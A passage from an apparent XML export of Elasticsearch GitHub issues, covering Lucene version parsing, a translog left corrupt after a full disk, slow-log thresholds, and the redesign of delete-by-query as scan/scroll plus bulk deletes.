</description><key id="38879236">7055</key><summary>Support parsing lucene minor version strings</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>blocker</label><label>bug</label><label>critical</label><label>v1.3.1</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-28T10:48:17Z</created><updated>2015-06-07T19:14:27Z</updated><resolved>2014-07-28T11:13:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-07-28T10:54:45Z" id="50324679">Left one minor comment. Other than that it looks good.
</comment><comment author="s1monw" created="2014-07-28T10:56:27Z" id="50324806">good call - I didn't add the pom / signature files :)
</comment><comment author="kimchy" created="2014-07-28T11:10:50Z" id="50325908">LGTM
</comment><comment author="s1monw" created="2014-07-28T11:14:33Z" id="50326173">For reference I opened a [Lucene issue](https://issues.apache.org/jira/browse/LUCENE-5850) for this 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Index broken on 'No space left on device' even after freeing disk and restarting</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7054</link><project id="" key="" /><description>If a node's data device disk runs out of space, freeing the disk and restarting the node will not bring the index back to life in some circumstances.
It seems like this happens only if a index request is corrupting the translog.
Occurred on ES 1.2.2. 

Steps to reproduce with 1 Node setup:
- Create a small disk: on OS X: Disk Utility: New image of 500 MB, called "SmallImageES".
  Mount that disk.
- Create required folders: 
  mkdir -p /Volumes/SmallImageES/{es,rnd}
- Configure ES; specify the path to refer to said disk:
  config/elasticsearch.yml:
  
  path:
   data: /Volumes/SmallImageES/es/data
   logs: /Volumes/SmallImageES/es/logs
- Start the ES node
- Index a couple of documents with the little Python script 'es.py'
  (https://gist.github.com/lumannnn/b5d93ac486e367d7f9f4#file-es-py).
- Start filling up the disk: `cat /dev/random &gt;&gt; /Volumes/SmallImageES/rnd/rnd.txt`
- Wait until disk is full (verify also with e.g. `du -hc /Volumes/SmallImageES/`)
- See console output and/or log
- Shutdown 'es.py' and ES node.
- Free disk space: `rm /Volumes/SmallImageES/rnd/rnd.txt`
- Start ES node
- See console output and/or log

This steps will not always reproduce the problem, but running this multiple times should result in a broken index.

Log outputs of a run where the IndexRequest occurs and the index stays broken even after freeing up the disk and restarting the node: 
https://gist.github.com/lumannnn/cabc2ae15dac68914176
https://gist.github.com/lumannnn/21d00ee9c71d0bafa126  (startup output)

Log output of a run where only the SegmentMerge fails and freeing up the disk and restarting the cluster results in a working index:
https://gist.github.com/lumannnn/f6ee6f8f87d314bba936
https://gist.github.com/lumannnn/6e88c287f2a4db03f06f (startup output)
</description><key id="38878169">7054</key><summary>Index broken on 'No space left on device' even after freeing disk and restarting</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">seut</reporter><labels /><created>2014-07-28T10:29:26Z</created><updated>2014-07-28T10:39:21Z</updated><resolved>2014-07-28T10:39:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-28T10:39:02Z" id="50323463">Hi @seut 

Thanks for the reproduction, but I think what is missing is: what should we do better in this case? This should be improved with #6554, where we can at least report that the translog is corrupt.  
</comment><comment author="clintongormley" created="2014-07-28T10:39:21Z" id="50323488">Closing in favour of #6554
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Slow log  doesn't record queries when it's set to 0ms</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7053</link><project id="" key="" /><description>As far as I understand, the queries can be written to the log by setting  "index.search.slowlog.threshold.query.trace" to 0ms.
I've tried it on the latest version, but it doesn't work.

Bug or By-Design?

Is there another way I can record the queries?
</description><key id="38877591">7053</key><summary>Slow log  doesn't record queries when it's set to 0ms</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">asafc64</reporter><labels><label>discuss</label></labels><created>2014-07-28T10:20:31Z</created><updated>2014-07-29T10:09:59Z</updated><resolved>2014-07-29T10:09:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-28T10:32:14Z" id="50322965">Set it to 1ms?
</comment><comment author="asafc64" created="2014-07-28T10:35:51Z" id="50323222">It Doesn't work either.
</comment><comment author="clintongormley" created="2014-07-28T10:42:48Z" id="50323772">It does, as long as your queries take at least 1ms:

```
index.search.slowlog.threshold.query.info: 1ms
```
</comment><comment author="asafc64" created="2014-07-28T10:49:12Z" id="50324267">Ok. Is there another way I write all the queries to the log? 
</comment><comment author="clintongormley" created="2014-07-28T11:25:34Z" id="50326960">Not currently, no
</comment><comment author="clintongormley" created="2014-07-29T10:09:59Z" id="50458033">Actually, just rechecked this and I was wrong  Setting it to `0` does work.  Try this:

```
index.search.slowlog.threshold.query.info: 0
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Reimplement delete-by-query as a bulk request</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7052</link><project id="" key="" /><description>Delete-by-query is problematic:  eg when deleting a document should trigger some action, eg: removing a percolator or removing a parent-child link.  It is also executed on both primary and replica, and can result in deleting different documents.

Delete-by-query should be replaced with a document-by-document delete using the bulk API.

Fixes: #6025
Fixes: #1712 
Fixes: #5797
Fixes: #3593 

Depends on #6914 
</description><key id="38874099">7052</key><summary>Reimplement delete-by-query as a bulk request</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>enhancement</label></labels><created>2014-07-28T09:28:22Z</created><updated>2016-08-06T10:42:05Z</updated><resolved>2015-06-17T13:49:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-07-29T14:16:06Z" id="50481231">We could use IndexWriter's tryDeleteDocument to delete by docID for each doc matching the query?  Typically it would be successful, and fast, if the reader used for searching is "recent"; when it fails to do the delete, you'd have to fall back to delete-by-Term.

Alternatively, it's also possible to wrap any Query and "spy on" the communication between the consumer (IndexWriter in this case) and that query, to see all docIDs that were visited; this way we could continue to use IW's more efficient delete-by-Query, but gather up all docIDs that were in fact deleted.  But this is a more hairy/evil/complex solution... though I think Solr already has something doing this.
</comment><comment author="uschindler" created="2014-12-31T10:41:52Z" id="68434846">Very nice: This would also allow to return the number of deleted documents to the consumer. So we can change the reply to include the document count. I sometimes have the problem that I need the count of deleted documents, which is hairy: You can first execute the query as count and later execute the delete, but this fails on high load because of non-atomicness.
</comment><comment author="mikemccand" created="2015-03-26T18:41:53Z" id="86663244">On #10067 @kimchy pointed out that we need not wait for task management API for this issue, i.e. we can just synchronously (in the user's current request) do the scan/scroll + bulk deletes...
</comment><comment author="uschindler" created="2015-03-26T18:47:18Z" id="86665460">+1

This also means the (incomplete) deprecation on delete-by-query APIs could be removed: #10082
</comment><comment author="TwP" created="2015-03-29T05:32:08Z" id="87360387">As a user who is quite a big fan of delete-by-query, I'm very much hoping it can be implemented in Elasticsearch itself as a scan/scroll + bulk deletes. Moving the scan/scroll + bulk deletes logic into the client would create a bit of wasted network traffic. But if that is the solution moving forward, then so be it. My vote is to keep the current API in place and change the underlying implementation.

Out of perverse curiosity .. with a client side solution, can the bulk deletes happen in parallel with the scroll/scan operations? As a set of documents are returned by the call to `/_search/scroll`, can those documents immediately be deleted via bulk delete operations? Or would I need to complete the entire scan and _then_ delete documents.

Will Elasticsearch be unhappy if we start deleting the data that it is currently iterating over.
</comment><comment author="uschindler" created="2015-03-29T08:09:47Z" id="87369561">Hi @TwP, 
you can do the scan and scroll in parallel. Scan and scroll uses the IndexReader openend at the time of the query and keeps it open. Deletes happening while scrolling will not be visible to this IndexReader until scrolling is done. All other search queries (or other scrolls) in parallel will see the deletes, of course. While scrolling you see a consistent view on the index.

I agree, we should keep the current API and implement the scan-scroll-delete behind the API (please also keep the Java API, not only the REST API (RequestBuilders,...). I am also a big fan of this API. One good thing would be: the delete-by-query can now return the number of deleted documents, which would be great, so I would be happy if the DeleteByQueryResponse would contain a "long getCount()"!
</comment><comment author="mikemccand" created="2015-03-29T08:38:17Z" id="87371747">&gt; you can do the scan and scroll in parallel. 

That's right: scan/scroll gives you a point-in-time view of the index.  It won't see any changes that happened after that time, as long as you keep the scroll "alive".

&gt;  I'm very much hoping it can be implemented in Elasticsearch itself as a scan/scroll + bulk deletes.

This is the plan... AbstractClient's deleteByQuery methods will be changed to final methods that do the scan/scroll + bulk delete.

&gt; please also keep the Java API, not only the REST API (RequestBuilders,...).

Yeah this is also now the plan...

&gt; the delete-by-query can now return the number of deleted documents, which would be great, so I would be happy if the DeleteByQueryResponse would contain a "long getCount()"!

OK I'll add that, and also "int getCount()" to each IndexDeleteByQueryResponse, because you can pass multiple index names to DBQ.
</comment><comment author="uschindler" created="2015-03-29T09:32:02Z" id="87378444">This just came into my mind: I already implemented the bulk delete stuff locally (in Java client, see https://sourceforge.net/p/panfmp/code/647/tree//main/trunk/src/de/pangaea/metadataportal/processor/DocumentProcessor.java?diff=516c2e8d5fcbc9791083b0a3:646 for example). For the given code version numbers are not really a problem, but for the deleteByQuery API to be consistent, it should execute scan-scroll and collect all doc ids AND version (!!!) numbers. When doing the bulk delete, each of this deletes should use the version number as returned by the scan-scroll, otherwise it could happen that updates/inserts of a concurrent indexing are destroyed.
</comment><comment author="kimchy" created="2015-03-29T09:33:10Z" id="87378477">@uschindler aye, it should be implemented similar to what we do with single document update, so for example, making sure to handle parent and routing into account
</comment><comment author="s1monw" created="2015-03-30T14:03:29Z" id="87691055">I think we should split the problems into engine level and shard level. The shard level problems (consistency between replica and primary) can be solved in a different PR than the engine level problems.

 I think we should take babysteps here and implement the deletion as a simple lucene search inside the engine and keep on using the query inside the transaction log etc. just keep everything as it is exception of iterating the hits inside the engine and delete them one by one. Also replication stays the same for now. This solves the refresh problem as well as the OOM etc. we can also utilize `IW#tryDeleteDocument` to speed up things. 

The shard level problem is a bigger one and should maybe be solved by using sequence IDs (delete after) or a lock on the shard level that prevents any other changes to happen concurrently on both replica and primaries. 

Solving the issue on the engine level lets up make progress on the right level IMO and we can fix the distributed system problems on the layer where they are happening. 
</comment><comment author="mikemccand" created="2015-03-30T17:09:47Z" id="87753741">&gt; I think we should split the problems into engine level and shard level. 

+1: if we can really decouple the two (engine impl vs shard consistency), that's wonderful.  I can tackle the engine level, to fix the OOME during concurrent indexing (#6025).
</comment><comment author="s1monw" created="2015-03-31T13:16:59Z" id="88079850">@mikemccand to be honest I think we should just stop indexing for the duration of the delete by query. Simple solution though...
</comment><comment author="nariman-haghighi" created="2015-06-11T13:49:15Z" id="111141699">To echo @TwP's sentiment, this is a massively common API that many teams use regularly to delete thousands of documents. Moving this to the client or deprecating it outright would be an utter disaster. A new server-side implementation that preserves the API is the only sensible path, please provide some final guidance on this so we can plan appropriately. 
</comment><comment author="tlrx" created="2015-06-11T14:41:38Z" id="111157802">@nariman-haghighi you may be interested in #11516 and #11584.
</comment><comment author="traviscollins" created="2015-07-04T03:51:06Z" id="118458876">I agree with @TwP and @nariman-haghighi - removing the delete-by-query API is really not serving users well. This is basic functionality that should be implemented on the server side in the core API with a simple client method. 
</comment><comment author="MattFriedman" created="2015-07-21T18:43:21Z" id="123435027">I see this issue is now closed. Has it been resolved? Will the native Elastic interface be maintained or removed? I read all the comments and I'm still not sure. 
</comment><comment author="clintongormley" created="2015-07-23T10:12:42Z" id="124045013">@MattFriedman in 2.0 delete-by-query has been implemented using bulk, and moved into a plugin: https://github.com/elastic/elasticsearch/tree/master/plugins/delete-by-query
</comment><comment author="pulkitsinghal" created="2016-08-06T05:54:51Z" id="238007764">@clintongormley - I went looking but did not find it ... should i instead rely on the summary I found in the commits stating:

&gt; The Delete-By-Query plugin has been removed in favor of a new Delete By Query API implementation in core. It now supports throttling, retries and cancellation but no longer supports timeouts. Instead use the cancel API to cancel deletes that run too long.
</comment><comment author="nik9000" created="2016-08-06T10:42:04Z" id="238017465">It should be mentioned somewhere in the migration docs but I'm on mobile.
Yes, in 5.0 delete-by-query is included in the distribution. It is
technically shipped in the mobile called reindex, meaning it is in a pre
bundled plugin.

On Aug 6, 2016 1:54 AM, "Pulkit Singhal" notifications@github.com wrote:

&gt; @clintongormley https://github.com/clintongormley - I went lookign but
&gt; did not find it ... should i instead rely on the summary I found in the
&gt; commits stating:
&gt; 
&gt; The Delete-By-Query plugin has been removed in favor of a new Delete By
&gt; Query API implementation in core. It now supports throttling, retries and
&gt; cancellation but no longer supports timeouts. Instead use the cancel API to
&gt; cancel deletes that run too long.
&gt; 
&gt; &#8212;
&gt; You are receiving this because you are subscribed to this thread.
&gt; Reply to this email directly, view it on GitHub
&gt; https://github.com/elastic/elasticsearch/issues/7052#issuecomment-238007764,
&gt; or mute the thread
&gt; https://github.com/notifications/unsubscribe-auth/AANLorGaujTViuxaRg6UAMUBnB-EN3ymks5qdCGvgaJpZM4CRdK3
&gt; .
</comment></comments><attachments /><subtasks /><customfields /></item></channel></rss>